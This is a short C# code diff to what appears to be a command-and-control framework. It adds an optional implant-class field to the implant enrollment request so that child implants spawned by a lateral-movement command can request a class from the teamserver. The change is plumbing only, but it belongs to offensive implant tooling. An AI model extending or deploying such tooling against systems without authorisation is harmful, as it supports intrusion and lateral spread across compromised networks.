@@ -128,7 +128,7 @@ internal static class C2
         RSA privateKey,
         X509Certificate2Collection? serverCAs,
         CancellationToken cancellationToken = default)
-        => await EnrollAsync(enrollUrl, stagerToken, parentImplantId: null, privateKey, serverCAs, new TransportProfile(), cancellationToken);
+        => await EnrollAsync(enrollUrl, stagerToken, parentImplantId: null, privateKey, serverCAs, new TransportProfile(), cancellationToken: cancellationToken);
 
     /// <summary>
     /// Enrolls and applies the malleable transport profile to the enroll request
@@ -144,6 +144,11 @@ internal static class C2
     /// 10.1, lateral.move); null is a top-level enroll. The teamserver resolves
     /// and scope-checks the parent before recording the linkage.
     /// </param>
+    /// <param name="implantClass">
+    /// The requested implant class for a child enroll (lateral.move's optional
+    /// second argument); null lets the teamserver default it. Only a child
+    /// enroll passes one.
+    /// </param>
     public static async Task<Enrollment> EnrollAsync(
         string enrollUrl,
         string stagerToken,
@@ -151,6 +156,7 @@ internal static class C2
         RSA privateKey,
         X509Certificate2Collection? serverCAs,
         TransportProfile profile,
+        string? implantClass = null,
         CancellationToken cancellationToken = default)
     {
         // Export the public half as a DER SubjectPublicKeyInfo -- exactly what
@@ -159,6 +165,7 @@ internal static class C2
         var body = new EnrollRequest
         {
             StagerTokenSecret = stagerToken,
+            Class = implantClass,
             PublicKey = Convert.ToBase64String(pubSpki),
             ParentImplantId = parentImplantId,
         };
